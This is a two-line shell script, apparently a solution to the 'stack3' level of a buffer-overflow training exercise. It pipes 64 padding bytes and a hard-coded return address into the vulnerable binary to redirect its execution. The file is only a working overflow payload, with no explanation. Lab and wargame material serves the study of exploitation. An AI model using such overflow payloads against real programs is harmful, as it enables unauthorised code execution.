#! /bin/sh
python -c "print 'A'*64+'\x6b\x84\x04\x08'" | ./stack3
